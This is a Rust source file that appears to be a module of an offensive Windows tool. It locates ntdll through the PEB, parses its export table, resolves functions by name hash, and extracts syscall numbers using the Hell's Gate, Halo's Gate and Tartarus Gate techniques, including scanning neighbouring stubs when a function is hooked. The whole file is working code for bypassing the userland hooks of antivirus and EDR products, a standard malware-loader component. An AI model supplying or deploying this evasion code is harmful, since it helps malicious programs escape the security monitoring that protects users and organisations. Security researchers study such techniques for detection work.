use crate::hash::dbj2;
use core::{ffi::c_void, ffi::CStr, ptr::read};
use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpebteb::{PEB, TEB}, 
};
use winapi::um::winnt::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64,
    IMAGE_NT_SIGNATURE, NT_TIB,
};

const RANGE: usize = 255;
const UP: isize = -32;
const DOWN: usize = 32;

pub unsafe fn get_peb() -> *mut PEB {
    let teb_offset = ntapi::FIELD_OFFSET!(NT_TIB, _Self) as u32;

    #[cfg(target_arch = "x86_64")]
    unsafe {
        use ntapi::winapi_local::um::winnt::__readgsqword;
        let teb = __readgsqword(teb_offset) as *mut TEB;
        (*teb).ProcessEnvironmentBlock
    }

    #[cfg(target_arch = "x86")]
    unsafe {
        use ntapi::winapi_local::um::winnt::__readfsdword;
        let teb = __readfsdword(teb_offset) as *mut TEB;
        (*teb).ProcessEnvironmentBlock
    }
}

pub unsafe fn get_ssn(function_name: u32) -> u16 {
    let peb = get_peb();
    let ntdll = get_ntdll(peb);

    let export_ntdll = get_export_ntdll(ntdll).expect("[!] Error exporting DLL");

    search_ssn(function_name, ntdll, export_ntdll).expect("[!] Error getting syscall number")
}

pub unsafe fn get_ntdll(peb: *mut PEB) -> *mut c_void {
    let ldr_data_table_entry = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8).offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;
    
    let dll_base = (*ldr_data_table_entry).DllBase;

    dll_base as *mut c_void
}

pub unsafe fn get_export_ntdll(dll_base: *mut c_void) -> Result<IMAGE_EXPORT_DIRECTORY, String> {
    let dos_header = dll_base as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return Err(String::from("[!] INVALID DOS SIGNATURE"));
    }

    let nt_header = dll_base.wrapping_add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
        return Err(String::from("[!] INVALID NT SIGNATURE"));
    }

    let export_directory_entry = dll_base.wrapping_add((*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;

    let image_export_directory = read(export_directory_entry);

    Ok(image_export_directory)
}

pub unsafe fn search_ssn(
    function_name: u32, 
    module: *mut c_void, 
    image_export_directory: IMAGE_EXPORT_DIRECTORY
) -> Result<u16, ()> {
    let address_functions = (module as usize + image_export_directory.AddressOfFunctions as usize) as *const u32;
    let address_names = (module as usize + image_export_directory.AddressOfNames as usize) as *const u32;
    let address_ordinals = (module as usize + image_export_directory.AddressOfNameOrdinals as usize) as *const u16;

    for i in 0..image_export_directory.NumberOfNames as isize {
        let name_addr = read(address_names.offset(i)) as usize;
        let name = CStr::from_ptr((module as usize + name_addr) as *const i8).to_string_lossy();

        let ordinal = read(address_ordinals.offset(i)) as isize;
        let function_offset = read(address_functions.offset(ordinal)) as usize;
        let function_address = (module as usize + function_offset) as *const u8;

        if dbj2(&name) == function_name {

            // Hells Gate
            // MOV R10, RCX
            // MOV RCX, <syscall>
            if read(function_address) == 0x4C
                && read(function_address.add(1)) == 0x8B
                && read(function_address.add(2)) == 0xD1
                && read(function_address.add(3)) == 0xB8
                && read(function_address.add(6)) == 0x00
                && read(function_address.add(7)) == 0x00 
            {
                let high = read(function_address.add(5)) as u16;
                let low = read(function_address.add(4)) as u16;
                let ssn = (high << 8) | low;
                return Ok(ssn);
            }

            // Halos Gate
            if read(function_address) == 0xE9 {
                for idx in 1..RANGE {
                    // check neighboring syscall down
                    if read(function_address.add(idx * DOWN)) == 0x4C
                        && read(function_address.add(1 + idx * DOWN)) == 0x8B
                        && read(function_address.add(2 + idx * DOWN)) == 0xD1
                        && read(function_address.add(3 + idx * DOWN)) == 0xB8
                        && read(function_address.add(6 + idx * DOWN)) == 0x00
                        && read(function_address.add(7 + idx * DOWN)) == 0x00 
                        {
                            let high = read(function_address.add(5 + idx * DOWN)) as u16;
                            let low = read(function_address.add(4 + idx * DOWN)) as u16;
                            let ssn = (high << 8) | (low - idx as u16);
                            return Ok(ssn);
                        }
                    // check neighboring syscall up
                    if read(function_address.offset(idx as isize * UP)) == 0x4c
                        && read(function_address.offset(1 + idx as isize * UP)) == 0x8B
                        && read(function_address.offset(2 + idx as isize * UP)) == 0xD1
                        && read(function_address.offset(3 + idx as isize * UP)) == 0xB8
                        && read(function_address.offset(6 + idx as isize * UP)) == 0x00
                        && read(function_address.offset(7 + idx as isize * UP)) == 0x00 
                        {
                            let high = read(function_address.offset(5 + idx as isize * UP)) as u16;
                            let low = read(function_address.offset(4 + idx as isize * UP)) as u16;
                            let ssn = (high << 8) | (low + idx as u16);
                            return Ok(ssn);
                        }
                }
            }

            // Tartarus Gate
            if read(function_address.add(3)) == 0xE9 {
                for idx in 1..RANGE {
                    // check neighboring syscall down
                    if read(function_address.add(idx * DOWN)) == 0x4C
                        && read(function_address.add(1 + idx * DOWN)) == 0x8B
                        && read(function_address.add(2 + idx * DOWN)) == 0xD1
                        && read(function_address.add(3 + idx * DOWN)) == 0xB8
                        && read(function_address.add(6 + idx * DOWN)) == 0x00
                        && read(function_address.add(7 + idx * DOWN)) == 0x00 
                        {
                            let high = read(function_address.add(5 + idx * DOWN)) as u16;
                            let low = read(function_address.add(4 + idx * DOWN)) as u16;
                            let ssn = (high << 8) | (low - idx as u16);
                            return Ok(ssn);
                        }
                    // check neighboring syscall up
                    if read(function_address.offset(idx as isize * UP)) == 0x4c
                        && read(function_address.offset(1 + idx as isize * UP)) == 0x8B
                        && read(function_address.offset(2 + idx as isize * UP)) == 0xD1
                        && read(function_address.offset(3 + idx as isize * UP)) == 0xB8
                        && read(function_address.offset(6 + idx as isize * UP)) == 0x00
                        && read(function_address.offset(7 + idx as isize * UP)) == 0x00 
                        {
                            let high = read(function_address.offset(5 + idx as isize * UP)) as u16;
                            let low = read(function_address.offset(4 + idx as isize * UP)) as u16;
                            let ssn = (high << 8) | (low + idx as u16);
                            return Ok(ssn);
                        }
                }
            }
        }
    }

    Err(())
}
